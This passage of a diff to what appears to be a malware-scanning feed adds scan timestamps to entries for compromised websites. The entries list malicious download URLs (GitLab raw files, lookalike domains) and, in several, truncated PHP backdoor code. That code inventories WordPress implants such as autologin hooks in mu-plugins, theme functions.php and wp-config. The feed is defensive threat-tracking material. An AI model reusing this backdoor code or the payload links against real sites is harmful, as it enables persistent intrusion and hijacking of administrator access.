       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwc1swtt03kh0omlt4yn5xf3"
+    "ReportId": "cmwc1swtt03kh0omlt4yn5xf3",
+    "ScannedAt": "2026-11-11T11:41:07.251000+00:00"
   },
   {
     "UrlDomain": "vestaawave.com",
@@ -1216,7 +1275,8 @@
     "ResolvedDownloadUrl": [
       "https://t-trustresnew.com/click/9984f7622e099be9"
     ],
-    "ReportId": "cmwby672k02sw0oml7jkd22cs"
+    "ReportId": "cmwby672k02sw0oml7jkd22cs",
+    "ScannedAt": "2026-11-11T09:59:28.613000+00:00"
   },
   {
     "UrlDomain": "buffalobio.com.br",
@@ -1235,7 +1295,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwby5n2702r60omluud4ff4d"
+    "ReportId": "cmwby5n2702r60omluud4ff4d",
+    "ScannedAt": "2026-11-11T09:59:02.682000+00:00"
   },
   {
     "UrlDomain": "bookdekho.in",
@@ -1254,7 +1315,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwby48nl02mp0omluf0ky7gd"
+    "ReportId": "cmwby48nl02mp0omluf0ky7gd",
+    "ScannedAt": "2026-11-11T09:57:57.378000+00:00"
   },
   {
     "UrlDomain": "smartofficeuaq.com",
@@ -1277,7 +1339,8 @@
     "ResolvedDownloadUrl": [
       "https://t-trustresnew.com/click/99ba2b847e73d63a"
     ],
-    "ReportId": "cmwby0gs402lo0omlhgh424qk"
+    "ReportId": "cmwby0gs402lo0omlhgh424qk",
+    "ScannedAt": "2026-11-11T09:55:01.264000+00:00"
   },
   {
     "UrlDomain": "auberge-merzouga.org",
@@ -1291,7 +1354,8 @@
     "Related": [],
     "Payload": "$tok='ZIz7n7Mcf2M4c6udAtTUpZh7XpGj3HxSY2FGHMIO1Gw';$id='44693d5cc82e3dda';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
     "ResolvedDownloadUrl": [],
-    "ReportId": "cmwby09qt02ky0omlsfqx4bp3"
+    "ReportId": "cmwby09qt02ky0omlsfqx4bp3",
+    "ScannedAt": "2026-11-11T09:54:52.167000+00:00"
   },
   {
     "UrlDomain": "airporttransfersbrighton.uk",
@@ -1310,7 +1374,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwby019g02k80oml1xg7iouc"
+    "ReportId": "cmwby019g02k80oml1xg7iouc",
+    "ScannedAt": "2026-11-11T09:54:41.185000+00:00"
   },
   {
     "UrlDomain": "www.colegiojeanpiaget.com.br",
@@ -1329,7 +1394,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwbxzqg702gf0omlez0radol"
+    "ReportId": "cmwbxzqg702gf0omlez0radol",
+    "ScannedAt": "2026-11-11T09:54:27.131000+00:00"
   },
   {
     "UrlDomain": "castech-mx.com",
@@ -1343,7 +1409,8 @@
     "Related": [],
     "Payload": "$tok='aT4UGJ6KOOTjg1uIgezmyN63JLNRWWQeJKC7TYUreFA';$id='4057e20af0caf7ad';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
     "ResolvedDownloadUrl": [],
-    "ReportId": "cmwbxz6hp02fb0omlrj2jq96w"
+    "ReportId": "cmwbxz6hp02fb0omlrj2jq96w",
+    "ScannedAt": "2026-11-11T09:54:01.319000+00:00"
   },
   {
     "UrlDomain": "aquacon.shop",
@@ -1362,7 +1429,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwbxyht102ep0omlxc2ue38d"
+    "ReportId": "cmwbxyht102ep0omlxc2ue38d",
+    "ScannedAt": "2026-11-11T09:53:29.317000+00:00"
   },
   {
     "UrlDomain": "bomwin22.com",
@@ -1386,7 +1454,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwbxycow02du0omlmyorrq8u"
+    "ReportId": "cmwbxycow02du0omlmyorrq8u",
+    "ScannedAt": "2026-11-11T09:53:22.670000+00:00"
   },
   {
     "UrlDomain": "www.astartesting.co.in",
@@ -1405,7 +1474,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwbxw3ho02cj0omlo6mj6rvg"
+    "ReportId": "cmwbxw3ho02cj0omlo6mj6rvg",
+    "ScannedAt": "2026-11-11T09:51:37.442000+00:00"
   },
   {
     "UrlDomain": "allpfassolution.com",
@@ -1424,7 +1494,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwbxtkp3027i0omlfqaxb3e4"
+    "ReportId": "cmwbxtkp3027i0omlfqaxb3e4",
+    "ScannedAt": "2026-11-11T09:49:39.741000+00:00"
   },
   {
     "UrlDomain": "cameronchetty.co.za",
@@ -1449,7 +1520,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwbxk7wd020h0omlqgstyvvt"
+    "ReportId": "cmwbxk7wd020h0omlqgstyvvt",
+    "ScannedAt": "2026-11-11T09:42:23.220000+00:00"
   },
   {
     "UrlDomain": "avene-hebergement.com",
@@ -1463,7 +1535,8 @@
     "Related": [],
     "Payload": "$tok='ZJxwoAtSoXmarObW39aYMewfxZze9kK_LGG7S4xjk-k';$id='a14cafdfddf3e35d';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
     "ResolvedDownloadUrl": [],
-    "ReportId": "cmwbxhglq01xh0omlyvj6ht79"
+    "ReportId": "cmwbxhglq01xh0omlyvj6ht79",
+    "ScannedAt": "2026-11-11T09:40:14.587000+00:00"
   },
   {
     "UrlDomain": "www.gxthienthan.vn",
@@ -1482,7 +1555,8 @@
     "ResolvedDownloadUrl": [
       "https://t-trustresnew.com/wp/a6a5d675566d2662"
     ],
-    "ReportId": "cmwbxg8r701uf0oml50u5wziv"
+    "ReportId": "cmwbxg8r701uf0oml50u5wziv",
+    "ScannedAt": "2026-11-11T09:39:17.767000+00:00"
   },
   {
     "UrlDomain": "alloyspectrum.com",
@@ -1506,7 +1580,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwbxfbop01t80omlciyjaavv"
+    "ReportId": "cmwbxfbop01t80omlciyjaavv",
+    "ScannedAt": "2026-11-11T09:38:34.916000+00:00"
   },
   {
     "UrlDomain": "bellaharmonizze.com",
@@ -1520,7 +1595,8 @@
     "Related": [],
     "Payload": "$tok='TbchK47nH93fyRUgujJTEerB8tBEPjlqZlswl6UqhGg';$id='17c124bf09bf24b7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
     "ResolvedDownloadUrl": [],
-    "ReportId": "cmwbxef4t01pt0omln3m7kdez"
+    "ReportId": "cmwbxef4t01pt0omln3m7kdez",
+    "ScannedAt": "2026-11-11T09:37:52.618000+00:00"
   },
   {
     "UrlDomain": "www.webplusinfotech.in",
@@ -1543,7 +1619,8 @@
     "ResolvedDownloadUrl": [
       "https://t-trustresnew.com/click/eb4c0ed8660ab961"
     ],
-    "ReportId": "cmwbxbkvs01oy0oml0eghrrje"
+    "ReportId": "cmwbxbkvs01oy0oml0eghrrje",
+    "ScannedAt": "2026-11-11T09:35:40.188000+00:00"
   },
   {
     "UrlDomain": "alldrugspharmacy.com",
@@ -1562,7 +1639,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwbxasem01nn0oml8ucnkogz"
+    "ReportId": "cmwbxasem01nn0oml8ucnkogz",
+    "ScannedAt": "2026-11-11T09:35:03.301000+00:00"
   },
   {
     "UrlDomain": "ambassadeurs.jenlain.fr",
@@ -1581,7 +1659,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
     ],
-    "ReportId": "cmwbxak0c01mz0oml7ttj48xr"
+    "ReportId": "cmwbxak0c01mz0oml7ttj48xr",
+    "ScannedAt": "2026-11-11T09:34:52.390000+00:00"
   },
   {
     "UrlDomain": "tabbaa-kitchens.com",
@@ -1599,7 +1678,8 @@
     "ResolvedDownloadUrl": [
       "https://frclau.com/eoN"
     ],
-    "ReportId": "cmwbx7qrb01fb0oml2d3g5v8b"
+    "ReportId": "cmwbx7qrb01fb0oml2d3g5v8b",
+    "ScannedAt": "2026-11-11T09:32:40.999000+00:00"
   },
   {
     "UrlDomain": "www.dynamitegamesstudio.com",
@@ -1627,7 +1707,8 @@
     "ResolvedDownloadUrl": [
       "https://frclau.com/eoN"
     ],
-    "ReportId": "cmwbk64gs09p50nmlvam5kbh2"
+    "ReportId": "cmwbk64gs09p50nmlvam5kbh2",
+    "ScannedAt": "2026-11-11T03:27:30.641000+00:00"
   },
   {
     "UrlDomain": "www.local7.it",
@@ -1653,7 +1734,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/c5edc53c54b52bdf"
     ],
-    "ReportId": "cmwbk5m7609of0nmlptmpaw9i"
+    "ReportId": "cmwbk5m7609of0nmlptmpaw9i",
+    "ScannedAt": "2026-11-11T03:27:06.962000+00:00"
   },
   {
     "UrlDomain": "shamla.org",
@@ -1678,7 +1760,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/0aa4b6ee05cd05e5"
     ],
-    "ReportId": "cmwbk3t7009na0nmliz4xz959"
+    "ReportId": "cmwbk3t7009na0nmliz4xz959",
+    "ScannedAt": "2026-11-11T03:25:42.737000+00:00"
   },
   {
     "UrlDomain": "autc.edu.au",
@@ -1697,7 +1780,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbk3oh109mj0nml164acw5r"
+    "ReportId": "cmwbk3oh109mj0nml164acw5r",
+    "ScannedAt": "2026-11-11T03:25:36.574000+00:00"
   },
   {
     "UrlDomain": "goldenes-lamlam.de",
@@ -1716,7 +1800,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbk2n3o09jm0nmlrpb738uv"
+    "ReportId": "cmwbk2n3o09jm0nmlrpb738uv",
+    "ScannedAt": "2026-11-11T03:24:48.163000+00:00"
   },
   {
     "UrlDomain": "mikachollection.com",
@@ -1737,7 +1822,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/982ecdb08738c570"
     ],
-    "ReportId": "cmwbk1xiw09i70nml7bimwy8c"
+    "ReportId": "cmwbk1xiw09i70nml7bimwy8c",
+    "ScannedAt": "2026-11-11T03:24:14.982000+00:00"
   },
   {
     "UrlDomain": "janusservices.org",
@@ -1758,7 +1844,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/cefc867900442c97"
     ],
-    "ReportId": "cmwbjuz3n09d10nmlormtigzm"
+    "ReportId": "cmwbjuz3n09d10nmlormtigzm",
+    "ScannedAt": "2026-11-11T03:18:50.464000+00:00"
   },
   {
     "UrlDomain": "labs.playgrnd.de",
@@ -1783,7 +1870,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/092760569b04dd7c"
     ],
-    "ReportId": "cmwbju3ih09b10nmlc3v0slch"
+    "ReportId": "cmwbju3ih09b10nmlc3v0slch",
+    "ScannedAt": "2026-11-11T03:18:09.539000+00:00"
   },
   {
     "UrlDomain": "savanyusag.eu",
@@ -1802,7 +1890,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589"
     ],
-    "ReportId": "cmwbjnjy809810nmllpabrhrb"
+    "ReportId": "cmwbjnjy809810nmllpabrhrb",
+    "ScannedAt": "2026-11-11T03:13:04.219000+00:00"
   },
   {
     "UrlDomain": "dileadiosalojoseco.com",
@@ -1823,7 +1912,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/9797dc17a4d52fd0"
     ],
-    "ReportId": "cmwbjdss9092o0nml3osfe7s8"
+    "ReportId": "cmwbjdss9092o0nml3osfe7s8",
+    "ScannedAt": "2026-11-11T03:05:29.121000+00:00"
   },
   {
     "UrlDomain": "thecarbarn.ch",
@@ -1848,7 +1938,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/f5e3d430790185d2"
     ],
-    "ReportId": "cmwbj7fy208zn0nmljhao1o2s"
+    "ReportId": "cmwbj7fy208zn0nmljhao1o2s",
+    "ScannedAt": "2026-11-11T03:00:32.561000+00:00"
   },
   {
     "UrlDomain": "www.novalearning.com.co",
@@ -1873,7 +1964,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/84be581882fb11c6"
     ],
-    "ReportId": "cmwbj4nkc08yq0nmlmtoxv0gg"
+    "ReportId": "cmwbj4nkc08yq0nmlmtoxv0gg",
+    "ScannedAt": "2026-11-11T02:58:22.469000+00:00"
   },
   {
     "UrlDomain": "www.allsurfaceracing.com",
@@ -1894,7 +1986,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/b442615134ce6b2f"
     ],
-    "ReportId": "cmwbj3ii008wq0nmlb1um9ci4"
+    "ReportId": "cmwbj3ii008wq0nmlb1um9ci4",
+    "ScannedAt": "2026-11-11T02:57:29.228000+00:00"
   },
   {
     "UrlDomain": "bonsaitheme.com",
@@ -1913,7 +2006,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbj3fcd08wa0nml756g3duz"
+    "ReportId": "cmwbj3fcd08wa0nml756g3duz",
+    "ScannedAt": "2026-11-11T02:57:25.157000+00:00"
   },
   {
     "UrlDomain": "sharkinvestmentgroup.com",
@@ -1934,7 +2028,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/2dccc5387a5d5584"
     ],
-    "ReportId": "cmwbiy96w08or0nmlgl0ptebn"
+    "ReportId": "cmwbiy96w08or0nmlgl0ptebn",
+    "ScannedAt": "2026-11-11T02:53:23.869000+00:00"
   },
   {
     "UrlDomain": "tavor-band.de",
@@ -1948,7 +2043,8 @@
     "Related": [],
     "Payload": "$tok='N2IoT5C2CzQppBecp28PWlS7ypL0l-ives--aDT27qI';$id='611ebe8fe0e7b6c7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
     "ResolvedDownloadUrl": [],
-    "ReportId": "cmwbir7jv08hc0nmltai47izd"
+    "ReportId": "cmwbir7jv08hc0nmltai47izd",
+    "ScannedAt": "2026-11-11T02:47:55.154000+00:00"
   },
   {
     "UrlDomain": "rocket5webdesign.com",
@@ -1977,7 +2073,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/7ffbfcfa0fdc9160"
     ],
-    "ReportId": "cmwbiqlzm08gh0nmljnutpf43"
+    "ReportId": "cmwbiqlzm08gh0nmljnutpf43",
+    "ScannedAt": "2026-11-11T02:47:27.224000+00:00"
   },
   {
     "UrlDomain": "minneolasc.com",
@@ -1993,7 +2090,8 @@
     "ResolvedDownloadUrl": [
       "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
     ],
-    "ReportId": "cmwbiqeaw08fp0nmlqsxqo5vn"
+    "ReportId": "cmwbiqeaw08fp0nmlqsxqo5vn",
+    "ScannedAt": "2026-11-11T02:47:17.243000+00:00"
   },
   {
     "UrlDomain": "hearingaidsinpune.com",
@@ -2014,7 +2112,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/174623c0f642d3eb"
     ],
-    "ReportId": "cmwbiq0c908e30nml98jjtj5l"
+    "ReportId": "cmwbiq0c908e30nml98jjtj5l",
+    "ScannedAt": "2026-11-11T02:46:59.129000+00:00"
   },
   {
     "UrlDomain": "oxfordbrazilebm.com",
@@ -2039,7 +2138,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/c29bf32503634b69"
     ],
-    "ReportId": "cmwbipf6308d80nml7wqdf9fl"
+    "ReportId": "cmwbipf6308d80nml7wqdf9fl",
+    "ScannedAt": "2026-11-11T02:46:31.732000+00:00"
   },
   {
     "UrlDomain": "www.torontoslidingdoors.com",
@@ -2060,7 +2160,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/2caa31d3ba1b8b12"
     ],
-    "ReportId": "cmwbip3zu08a90nmlxmybaoiu"
+    "ReportId": "cmwbip3zu08a90nmlxmybaoiu",
+    "ScannedAt": "2026-11-11T02:46:17.241000+00:00"
   },
   {
     "UrlDomain": "bailbondsofal.com",
@@ -2079,7 +2180,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbiose908970nmlhpudyu9c"
+    "ReportId": "cmwbiose908970nmlhpudyu9c",
+    "ScannedAt": "2026-11-11T02:46:02.110000+00:00"
   },
   {
     "UrlDomain": "globalactivation.africa",
@@ -2098,7 +2200,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbinly5085z0nmllv9wx9d9"
+    "ReportId": "cmwbinly5085z0nmllv9wx9d9",
+    "ScannedAt": "2026-11-11T02:45:06.052000+00:00"
   },
   {
     "UrlDomain": "www.kjnails.it",
@@ -2117,7 +2220,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbime7q084t0nmlzdhwfv8l"
+    "ReportId": "cmwbime7q084t0nmlzdhwfv8l",
+    "ScannedAt": "2026-11-11T02:44:10.530000+00:00"
   },
   {
     "UrlDomain": "euroshopfronts.co.uk",
@@ -2136,7 +2240,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
